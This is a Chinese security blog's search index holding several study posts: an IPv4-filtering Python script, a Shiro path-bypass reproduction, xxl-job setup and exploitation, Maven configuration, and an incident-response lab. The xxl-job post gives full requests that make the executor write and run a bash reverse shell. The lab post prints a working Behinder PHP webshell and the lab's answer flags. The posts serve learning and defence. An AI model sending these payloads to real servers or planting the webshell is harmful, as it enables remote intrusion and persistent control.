<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>判断ip练习-python</title>
      <link href="/2024/08/10/%E5%88%A4%E6%96%ADip%E7%BB%83%E4%B9%A0-python/"/>
      <url>/2024/08/10/%E5%88%A4%E6%96%ADip%E7%BB%83%E4%B9%A0-python/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># encoding=&#39;utf-8&#39;&quot;&quot;&quot;https://blog.51cto.com/u_16213398/9007087https://docs.python.org/zh-cn/3/howto/ipaddress.html#ipaddress-howtohttps://blog.csdn.net/u013541325/article/details/117530957https://www.cnblogs.com/itsfei/p/17445303.htmlhttps://mwell.tech/archives/9630#:~:text=%E4%BD%BF%E7%94%A8%20ipaddress%20%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86%20IP%20%E7%BD%91%E7%BB%9C%201%201.%20%E6%A3%80%E6%9F%A5IP%E5%9C%B0%E5%9D%80%E6%98%AFIPv4%E8%BF%98%E6%98%AFIPv6,true%E3%80%82%20...%208%208.%20%E4%BD%BF%E7%94%A8%20IPv4Interface%20%E5%AF%B9%E8%B1%A1%20&quot;&quot;&quot;import reimport ipaddress# 保留ipv4地址(正则法)&#39;&#39;&#39;def check_ip(ipAddr):    compile_ip=re.compile(&#39;^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$&#39;)    if compile_ip.match(ipAddr):        return True    else:        return False&#39;&#39;&#39;def is_ipv4(ipAddr):    try:        ipaddress.IPv4Address(ipAddr)        return True    except ipaddress.AddressValueError:        return False# 去除内网地址(ip):&#39;&#39;&#39;def is_private_ip(ipArrd):    subnet = &#123;        &quot;10.0.0.0/8&quot;,        &quot;172.16.0.0/12&quot;,        &quot;192.168.0.0/16&quot;    &#125;    ip = ipaddress.ip_address(ipArrd)    try:        for lan in subnet:            if ip in ipaddress.ip_network(lan):                return True        return False    except ipaddress.AddressValueError:        return &quot;error！！！&quot;&#39;&#39;&#39;with open(&quot;ip.txt&quot;,&#39;r&#39;, encoding=&#39;utf-8&#39;) as f:    ip_list = f.read()#去除杂七杂八的parttern1 = re.compile(&#39;IOC：|ioc：|XFF：|&quot;|”|XFF代理：&#39;)data = re.sub(parttern1,&quot;&quot;,ip_list)#分割成多行parttern2=re.compile(&#39;,|，|、&#39;)data = re.sub(parttern2,&#39;\n&#39;,data) #re.sub返回的是新的列表#存为列表ip_list = data.split(&quot;\n&quot;)#去除空格ip_list = [x.strip() for x in ip_list if x.strip() != &#39;&#39;]#去除端口号final_list = [re.findall(r&#39;\d+\.\d+\.\d+\.\d+&#39;, x)[0] if &quot;:&quot; in x else x  for x in ip_list]#保留ipv4地址final_list = [x for x in final_list if is_ipv4(x) == True]#去除内网地址final_list = [x for x in final_list if ipaddress.ip_address(x).is_private == False]#打印测试with open(&quot;output.txt&quot;, &#39;w&#39;,encoding=&#39;utf-8&#39;) as f:    for i in final_list:        f.write(i + &quot;\n&quot;)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-shiro</title>
      <link href="/2024/08/09/vulnhub-shiro/"/>
      <url>/2024/08/09/vulnhub-shiro/</url>
      
        <content type="html"><![CDATA[<p><strong>超级详细：</strong><a href="https://xz.aliyun.com/t/11633#toc-2">https://xz.aliyun.com/t/11633#toc-2</a> # 好文</p><h1 id="什么是Shiro"><a href="#什么是Shiro" class="headerlink" title="什么是Shiro"></a>什么是Shiro</h1><p><a href="https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020">Apache</a> Shiro 是Java 的一个安全框架。Shiro 可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE 环境，也可以用在JavaEE 环境。Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与Web 集成、缓存等。</p><h1 id="CVE-2010-3863：权限绕过"><a href="#CVE-2010-3863：权限绕过" class="headerlink" title="CVE-2010-3863：权限绕过"></a>CVE-2010-3863：权限绕过</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造<code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等绕过权限验证</p><p>参考链接：</p><ul><li><a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34</a></li><li><a href="https://xz.aliyun.com/t/11633#toc-2">https://xz.aliyun.com/t/11633#toc-2</a> # 好文</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863</a></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个搭载Shiro 1.0.0的应用：</p><pre><code>docker compose up -d</code></pre><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看首页。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接请求管理页面<code>/admin</code>，无法访问，将会被重定向到登录页面：</p><p><img src="E:\Youzipii\source\image\image-20240809142903369.png" alt="image-20240809142903369"></p><p>构造恶意请求<code>/./admin</code>，即可绕过权限校验，访问到管理页面：</p><p><img src="E:\Youzipii\source\image\image-20240809142935850.png" alt="image-20240809142935850"></p>]]></content>
      
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxl-job</title>
      <link href="/2024/08/07/xxl-job/"/>
      <url>/2024/08/07/xxl-job/</url>
      
        <content type="html"><![CDATA[<h1 id="xxl-job"><a href="#xxl-job" class="headerlink" title="xxl-job"></a>xxl-job</h1><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><p>在使用之前，需要把maven配置好，可以看我上一篇关于配置maven的文章，配置完成后可以看这篇教程</p><p>使用教程：<a href="https://blog.csdn.net/f2315895270/article/details/104714692">https://blog.csdn.net/f2315895270/article/details/104714692</a></p><p>我也会跟着操作一遍</p><h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><pre><code>mvn compile</code></pre><p><img src="/../image/xxl-job/1.png" alt="image-20240807091924833"></p><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><p>直接用doc下的sql文件即可</p><p><img src="/../image/xxl-job/2.png" alt="image-20240807092056442"></p><p>打开xxl-job-admin模块，在application.properties中进行后台的配置</p><p><img src="/../image/xxl-job/3.png" alt="image-20240807092320507"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240807092522122.png" alt="image-20240807092522122"></p><p>注意在数据库地址哪里加上时区属性，否则乱码</p><p><img src="/../image/xxl-job/4.png" alt="image-20240807092619516"></p><h2 id="启动项目"><a href="#启动项目" class="headerlink" title="启动项目"></a>启动项目</h2><p>然后我们启动XxlJobAdminApplication类，访问<a href="http://localhost:8080/xxl-job-admin">http://localhost:8080/xxl-job-admin</a> 默认账户admn，密码123456</p><p><img src="/../image/xxl-job/5.png" alt="image-20240807092934369"></p><p><img src="/../image/xxl-job/6.png" alt="image-20240807092918239"></p><p>成功启动了</p><p><img src="/../image/xxl-job/7.png" alt="image-20240807093014559"></p><p>参考文章中说定位到springboot模块下的jobhandler层下面，但我下载的更新后的项目，里面已经不再是jobhandler，可以看项目给的SampleXxlJob改，但代码能力不行，我还是找新教程把</p><p><img src="/../image/xxl-job/8.png" alt="image-20240807111826397"></p><p>换成了这个，我后续跟的是另一个教程java<a href="https://blog.csdn.net/2303_79633394/article/details/139549331?ops_request_misc=&request_id=&biz_id=102&utm_term=xxl-job%E4%BD%BF%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-139549331.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">定时任务框架xxl-job(使用、总结)</a>，按照他的测试代码试了试，还发现，可以用docker拉这个项目，但我觉得可能就不是很好修改了，这里我们就不用他的执行器了，用默认的</p><pre><code class="java">package com.xxl.job.executor.service.jobhandler; import cn.hutool.core.util.RandomUtil;import com.xxl.job.core.context.XxlJobHelper;import com.xxl.job.core.handler.annotation.XxlJob;import org.springframework.stereotype.Component; import java.time.LocalDateTime;import java.util.Arrays;import java.util.List; /** * 任务处理器 */@Componentpublic class JobHandler &#123;     //定义一组任务    private List&lt;Integer&gt; dataList = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);     /**     * 普通任务     */    @XxlJob(&quot;firstJob&quot;)    public void firstJob() throws Exception &#123;        System.out.println(&quot;firstJob执行了.... &quot; + LocalDateTime.now());        for (Integer data : dataList) &#123;            XxlJobHelper.log(&quot;data= &#123;&#125;&quot;, data); //写日志到xxl-job中            //每次执行任务后，随机暂停一段时间            Thread.sleep(RandomUtil.randomInt(100, 500));        &#125;        System.out.println(&quot;firstJob执行结束了.... &quot; + LocalDateTime.now());    &#125; &#125;</code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>测试的时候会少一个依赖，hutool的，本地仓库是有，我们给他加进去就行了</p><pre><code class="xml">        &lt;dependency&gt;            &lt;groupId&gt;cn.hutool&lt;/groupId&gt;            &lt;artifactId&gt;hutool-all&lt;/artifactId&gt;            &lt;version&gt;5.7.7&lt;/version&gt;        &lt;/dependency&gt;</code></pre><p>然后更新一下环境就行了，但当时也不知道哪一个成的</p><pre><code>mvn clean insall</code></pre><p>然后还点了一下maven重载，回归正题，在任务管理里面新增任务</p><p><img src="/../image/xxl-job/9.png" alt="image-20240807112854359"></p><p>编写完成后，重启服务，在任务管理中创建任务：</p><p><img src="/../image/xxl-job/10.png" alt="image-20240807120240234"></p><p>这个新增参数和之前好像也有变化，稍微调了调，让他看起来和攻略里差不多，然后记得启动执行器XxlJobExecutorApplication</p><p><img src="/../image/xxl-job/11.png" alt="image-20240807124553451"></p><p>也是成功执行了，后续的cron控制定时任务等其它操作，可以继续看这个*<a href="https://blog.csdn.net/2303_79633394/article/details/139549331?ops_request_misc=&request_id=&biz_id=102&utm_term=xxl-job%E4%BD%BF%E7%94%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-139549331.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">攻略</a>*</p><h1 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h1><p>在docker里也有一个unacc的漏洞，我们先测试这个</p><h3 id="uacc"><a href="#uacc" class="headerlink" title="uacc"></a>uacc</h3><ol><li>环境搭建</li></ol><pre><code>docker-compose up -d</code></pre><ol start="2"><li>查看服务是否启动</li></ol><pre><code>nmap 192.168.174.137</code></pre><p><img src="/../image/xxl-job/12.png" alt="image-20240807223359701"></p><p>可以看到8080是admin服务，9999是exector端，我们访问9999端口</p><p><img src="/../image/xxl-job/13.png" alt="image-20240807223434680"></p><p>看到这个就是服务启动成功了</p><ol start="3"><li>poc测试</li></ol><p>访问<a href="http://localhost:9999/run%E6%8A%93%E5%8C%85">http://localhost:9999/run抓包</a></p><p><img src="/../image/xxl-job/14.png" alt="image-20240807224749550"></p><p>修改请求方式为<code>POST</code> ，并写入exp，然后发送请求</p><pre><code class="json">&#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.174.160/9999 0&gt;&amp;1&#39; &gt; /tmp/1.sh&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,  &quot;broadcastTotal&quot;: 0&#125;</code></pre><p><img src="/../image/xxl-job/15.png" alt="image-20240807230548050"></p><p>这样子是先创建了一个shell脚本，等会我们执行它即可，现在在本机开启监听</p><pre><code>nc -lvvp 9999</code></pre><p>然后再发一个赋予权限和一个执行shell脚本的exp</p><pre><code class="json">&#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;chmod +x /tmp/1.sh&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,  &quot;broadcastTotal&quot;: 0&#125;</code></pre><p><img src="/../image/xxl-job/16.png" alt="image-20240807230819254"></p><pre><code class="json">&#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;/bin/bash /tmp/1.sh&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,  &quot;broadcastTotal&quot;: 0&#125;</code></pre><p><img src="/../image/xxl-job/17.png" alt="image-20240807230912173"></p><p>不懂怎么不行，文件倒是创建了，在容器里测试了下，可以返回，但发包就不行</p><p><img src="/../image/xxl-job/18.png" alt="image-20240807231627257"></p><p>创建个2.sh，给他弹到靶机去试试</p><pre><code>echo &#39;bash -i &gt;&amp; /dev/tcp/192.168.174.137/8888 0&gt;&amp;1&#39; &gt; /tmp/2.sh</code></pre><p>不懂怎么回事，在里面弹就行，外面最多到赋予权限，试了下删除点东西，原来是包的东西太多了</p><pre><code class="json">POST /run HTTP/1.1Host: 192.168.174.137:9999User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeContent-Length: 366&#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;/bin/bash /tmp/1.sh&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,  &quot;broadcastTotal&quot;: 0&#125;</code></pre><p>删掉一些东西就行了</p><p><img src="/../image/xxl-job/19.png" alt="image-20240808135237270"></p>]]></content>
      
      
      
        <tags>
            
            <tag> xxl-job </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven环境配置</title>
      <link href="/2024/08/07/Maven%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/07/Maven%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="maven配置"><a href="#maven配置" class="headerlink" title="maven配置"></a>maven配置</h1><p>环境变量的配置：<a href="https://blog.csdn.net/u012660464/article/details/114113349">https://blog.csdn.net/u012660464/article/details/114113349</a></p><h2 id="下载maven"><a href="#下载maven" class="headerlink" title="下载maven"></a>下载maven</h2><p><a href="https://maven.apache.org/download.cgi">https://maven.apache.org/download.cgi</a></p><p><img src="/../image/image-20240806223129672.png" alt="image-20240806223129672"></p><h2 id="Maven软件的安装"><a href="#Maven软件的安装" class="headerlink" title="Maven软件的安装"></a>Maven软件的安装</h2><p>Maven 下载后，将 Maven 解压到一个没有中文没有空格的路径下，比如D:\extools\apache-maven-3.9.8下面。 解压D:\extools\apache-maven-3.9.8后目录结构如下：</p><p><img src="/../image/image-20240806223233138.png" alt="image-20240806223233138"></p><ol><li>bin:存放了 maven 的命令</li><li>boot:存放了一些 maven 本身的引导程序，如类加载器等</li><li>conf:存放了 maven 的一些配置文件，如 setting.xml 文件</li><li>lib:存放了 maven 本身运行所需的一些 jar 包</li></ol><h2 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h2><p>1.配置 MAVEN_HOME ，变量值就是你的 maven 安装的路径（bin 目录之前一级目录）</p><p><img src="/../image/image-20240806223452765.png" alt="image-20240806223452765"></p><p>2.将MAVEN_HOME 添加到Path系统变量</p><p><img src="/../image/image-20240806223524333.png" alt="image-20240806223524333"></p><h2 id="Maven-软件版本测试"><a href="#Maven-软件版本测试" class="headerlink" title="Maven 软件版本测试"></a>Maven 软件版本测试</h2><pre><code>mvn -v</code></pre><p><img src="/../image/image-20240806223552256.png" alt="image-20240806223552256"></p><h2 id="Maven-仓库"><a href="#Maven-仓库" class="headerlink" title="Maven 仓库"></a>Maven 仓库</h2><ol><li>Maven的仓库分类<br>本地仓库: 位于自己计算机中的仓库, 用来存储从远程仓库或中央仓库下载的插件和 jar 包，<br>远程仓库: 需要联网才可以使用的仓库，阿里提供了一个免费的maven 远程仓库。<br>中央仓库: 在 maven 软件中内置一个远程仓库地址 <a href="http://repo1.maven.org/maven2">http://repo1.maven.org/maven2</a> ，它是中 央仓库，服务于整个互联网，它是由 Maven 团队自己维护，里面存储了非常全的 jar 包，它包 含了世界上大部分流行的开源项目构件</li></ol><p>原文链接：<a href="https://blog.csdn.net/u012660464/article/details/114113349">https://blog.csdn.net/u012660464/article/details/114113349</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/5c1c81c8f901a7f8a9d912eabc98dbbf.jpeg" alt="在这里插入图片描述"></p><h3 id="Maven-本地仓库的配置"><a href="#Maven-本地仓库的配置" class="headerlink" title="Maven 本地仓库的配置"></a>Maven 本地仓库的配置</h3><ol><li>maven仓库默认是在 C盘 .m2 目录下,我们不要将仓库放在C盘,所以这里要重新配置一下</li></ol><p>这里就不提供本地仓库了，担心版本问题，我就把自己原来的仓库移个位置</p><p>（注意最好放在没有中文及空格的目录下），我这里就直接把整个.m2文件移动到D:\extools</p><ol start="2"><li>在maven安装目录中,进入 conf文件夹, 可以看到一个 settings.xml 文件中, 我们在这个文件中, 进行本地仓库的配置</li></ol><p><img src="/../image/image-20240806224511335.png" alt="image-20240806224511335"></p><p><img src="/../image/image-20240806224700717.png" alt="image-20240806224700717"></p><ol start="3"><li>配置阿里云远程仓库</li></ol><p>打开 settings.xml,找到 标签 , 下面的内容复制到 中 即可</p><pre><code class="xml">&lt;!--setting.xml中添加如下配置--&gt;&lt;mirrors&gt;    &lt;mirror&gt;        &lt;id&gt;aliyun&lt;/id&gt;          &lt;!-- 中心仓库的 mirror(镜像) --&gt;        &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;            &lt;name&gt;Nexus aliyun&lt;/name&gt;        &lt;!-- aliyun仓库地址 以后所有要指向中心仓库的请求，都会指向aliyun仓库--&gt;        &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;      &lt;/mirror&gt;&lt;/mirrors&gt;</code></pre><p><img src="/../image/image-20240806224912908.png" alt="image-20240806224912908"></p><h2 id="在Idea中关联Maven"><a href="#在Idea中关联Maven" class="headerlink" title="在Idea中关联Maven"></a>在Idea中关联Maven</h2><p>详细教程：<a href="https://blog.csdn.net/qq_43410878/article/details/123812267">https://blog.csdn.net/qq_43410878/article/details/123812267</a></p><p>在idea中关联本地安装的maven，后续就可以通过idea使用maven来管理项目</p><p>Maven 工程的目录结构</p><p>作为一个 maven 工程，它的 src目录和 pom.xml 是必备的。<br>进入 src目录后，我们发现它里面的目录结构如下：</p><ul><li><p>src&#x2F;main&#x2F;java —— 存放项目的.java 文件</p></li><li><p>src&#x2F;main&#x2F;resources —— 存放项目资源文件，如 spring, hibernate 配置文件</p></li><li><p>src&#x2F;test&#x2F;java —— 存放所有单元测试.java 文件，如 JUnit 测试类</p></li><li><p>src&#x2F;test&#x2F;resources —— 测试资源文件</p></li><li><p>target —— 项目输出位置，编译后的class 文件会输出到此目录</p></li><li><p>pom.xml——maven 项目核心配置文件</p></li></ul><p>注意：如果是普通的 java 项目，那么就没有webapp 目录。</p><p>原文链接：<a href="https://blog.csdn.net/qq_43410878/article/details/123812267">https://blog.csdn.net/qq_43410878/article/details/123812267</a></p><p><img src="/../image/image-20240806225030929.png" alt="image-20240806225030929"></p><p>这里会自动下载相关项目的插件</p><p><img src="/../image/image-20240806225153556.png" alt="image-20240806225153556"></p><pre><code>mvn install  #</code></pre><p><img src="/../image/image-20240806225945110.png" alt="image-20240806225945110"></p><p>但还是有些找不到，本来想试试手动安装，但说是不推荐，后续比较麻烦，但他也提供了另一条命令</p><p><a href="https://www.coder.work/article/6959032">https://www.coder.work/article/6959032</a></p><pre><code>mvn org.apache.maven.plugins:maven-dependency-plugin:2.6:get -Dartifact=groupId:artifactId:version</code></pre><p>有一点麻烦的就是我不知道要不要确定版本号，感觉还是没配置好，但这样一个一个也能解决问题，麻烦一点就是了</p><p><img src="/../image/image-20240807090129426.png" alt="image-20240807090129426"></p><p>有时候是因为自己手动装的环境，它识别不到，和新下载的冲突了，删除原来的又可以了</p><p><img src="/../image/image-20240807090200926.png" alt="image-20240807090200926"></p><p>但有的时候又还是不行，需要手动改下版本号。。。还有就是安装时会遇到下面这种错误</p><p><img src="/../image/image-20240807090459456.png" alt="image-20240807090459456"></p><p>实际上是安装成功了的</p><p><img src="/../image/image-20240807090609948.png" alt="image-20240807090609948"></p><p>手动配置一下版本</p><p><img src="/../image/image-20240807090658684.png" alt="image-20240807090658684"></p><p>解决了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急响应靶场-zgsf-web1</title>
      <link href="/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/"/>
      <url>/2024/08/06/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-zgsf-web1/</url>
      
        <content type="html"><![CDATA[<p>参考：<a href="https://blog.csdn.net/qq_61872115/article/details/136618102">https://blog.csdn.net/qq_61872115/article/details/136618102</a></p><h1 id="前景需要："><a href="#前景需要：" class="headerlink" title="前景需要："></a>前景需要：</h1><p>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p><p>用户：<br>administrator<br>密码<br><a href="mailto:&#90;&#x67;&#x73;&#102;&#x40;&#97;&#100;&#x6d;&#105;&#110;&#46;&#99;&#x6f;&#109;">&#90;&#x67;&#x73;&#102;&#x40;&#97;&#100;&#x6d;&#105;&#110;&#46;&#99;&#x6f;&#109;</a></p><h1 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h1><p>登陆主机，启动小皮</p><p><img src="/../image/image-20240806124005693.png" alt="image-20240806124005693"></p><p>访问网站</p><p><img src="/../image/image-20240806124456124.png" alt="image-20240806124456124"></p><p>找到网站根目录，直接查杀一下是否存在后门文件，我这里用的是D盾</p><p><img src="/../image/image-20240806125049731.png" alt="image-20240806125049731"></p><p>查看文件内容，不是这个。。。用火绒把，也没有</p><p><img src="/../image/image-20240806132945478.png" alt="image-20240806132945478"></p><p>我说呢，被windows defender给隔离了</p><p><img src="/../image/image-20240806133037186.png" alt="image-20240806133037186"></p><p>打开看看</p><pre><code class="php">&lt;?php@error_reporting(0);session_start();    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond    $_SESSION[&#39;k&#39;]=$key;    session_write_close();    $post=file_get_contents(&quot;php://input&quot;);    if(!extension_loaded(&#39;openssl&#39;))    &#123;        $t=&quot;base64_&quot;.&quot;decode&quot;;        $post=$t($post.&quot;&quot;);                for($i=0;$i&lt;strlen($post);$i++) &#123;                 $post[$i] = $post[$i]^$key[$i+1&amp;15];                 &#125;    &#125;    else    &#123;        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);    &#125;    $arr=explode(&#39;|&#39;,$post);    $func=$arr[0];    $params=$arr[1];    class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;    @call_user_func(new C(),$params);?&gt;</code></pre><p>得到密码rebeyond</p><h1 id="网站日志排查"><a href="#网站日志排查" class="headerlink" title="网站日志排查"></a>网站日志排查</h1><p>查看apache日志，在小皮的扩展里找到日志</p><p><img src="/../image/image-20240806133324756.png" alt="image-20240806133324756"></p><p>发现ip：192.168.126.1一直访问呢shell文件</p><p>然后对于这个地址我们可以访问一下就知道，他是在暴力破解账户密码</p><p><img src="/../image/image-20240806133641734.png" alt="image-20240806133641734"></p><p><img src="/../image/image-20240806133705685.png" alt="image-20240806133705685"></p><p>查看后续日志可发现它破解成功了，很可能是存在弱口令</p><p><img src="/../image/image-20240806133910009.png" alt="image-20240806133910009"></p><p><img src="/../image/image-20240806133817603.png" alt="image-20240806133817603"></p><p>并且在后台访问&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;目录，成功将shell.php后门传上去了</p><p><img src="/../image/image-20240806133947496.png" alt="image-20240806133947496"></p><h1 id="隐藏账户"><a href="#隐藏账户" class="headerlink" title="隐藏账户"></a>隐藏账户</h1><p>多种方法，控制面板或注册表</p><p><img src="/../image/image-20240806134039485.png" alt="image-20240806134039485"></p><p>注册表这边我没有找到，试试日志分析，查看登陆成功的日志，先在事件查看器例保存Security日志，再用logparser分析</p><pre><code>LogParser.exe -i:EVT -oDATAGRID &quot;SELECT * FROM Security.evtx WHERE EventID=4625&quot;</code></pre><p><img src="/../image/image-20240806135325167.png" alt="image-20240806135325167"></p><h1 id="挖矿程序"><a href="#挖矿程序" class="headerlink" title="挖矿程序"></a>挖矿程序</h1><p>先在寻找挖矿程序，并找到它的外联域名信息</p><p>找到用户文件夹下的hack168下的桌面文件，发现程序信息先在寻找挖矿程序，</p><p><img src="/../image/image-20240806135435899.png" alt="image-20240806135435899"></p><p>反编译</p><p>列举用到的工具：</p><p>pyinstxtractor反编译工具：<a href="%5BPython38%5D(C:%5CUsers%5Cyxz%5CAppData%5CLocal%5CPrograms%5CPython%5CPython38)">GitHub - extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor</a></p><p>pyc反编译工具：<a href="https://v2.toolkk.com/tools/pyc-decomplie">pyc反编译 - 工具匠</a></p><p>在线的刚好在维护.要换一个</p><p><img src="/../image/image-20240806142135137.png" alt="image-20240806142135137"></p><p>成功反编译，在文件中找到Kuang.pyc</p><p><img src="/../image/image-20240806142201334.png" alt="image-20240806142201334"></p><p>在线反编译</p><p><img src="/../image/image-20240806142230129.png" alt="image-20240806142230129"></p><p>最终得到矿池域名：wakuang.zhigongshanfang.top</p><h1 id="提交结果"><a href="#提交结果" class="headerlink" title="提交结果"></a>提交结果</h1><p>提交到最后一个时，会直接结束</p><p><img src="/../image/image-20240806142356735.png" alt="image-20240806142356735"></p><p>反编译看看结果</p><pre><code class="python">print(&#39;公众号：知攻善防实验室&#39;)print(&#39;欢迎使用知攻善防实验室-应急响应训练靶机解题系统&#39;)print(&#39;在此之前，您应该获取到以下信息&#39;)print(&#39;1.攻击者的shell密码&#39;)print(&#39;2.攻击者的IP地址&#39;)print(&#39;3.攻击者的隐藏账户名称&#39;)print(&#39;4.攻击者挖矿程序的矿池域名&#39;)num = input(&#39;你准备好了吗？（y or n）&#39;)if num == &#39;y&#39;:    shellpass = input(&#39;请输入攻击者的shell密码:&#39;)    if shellpass == &#39;rebeyond&#39;:        print(&#39;题解正确！&#39;)        IPadd = input(&#39;请输入攻击者的IP地址&#39;)        if IPadd == &#39;192.168.126.1&#39;:            print(&#39;题解正确！&#39;)            username = input(&#39;请输入攻击者的隐藏账户名称:&#39;)            if username == &#39;hack168&#39; or username == &#39;hack168$&#39;:                print(&#39;题解正确！&#39;)                wakuang = input(&#39;请输入攻击者挖矿程序的矿池域名:&#39;)                if wakuang == &#39;wakuang.zhigongshanfang.top&#39;:                    print(&#39;题解正确！&#39;)                    print(&#39;恭喜您，该靶机已被您攻破！&#39;)                    print(&#39;恭喜您，该靶机已被您攻破！&#39;)                    print(&#39;恭喜您，该靶机已被您攻破！&#39;)                    print(&#39;恭喜您，该靶机已被您攻破！&#39;)</code></pre><p>没错滴</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
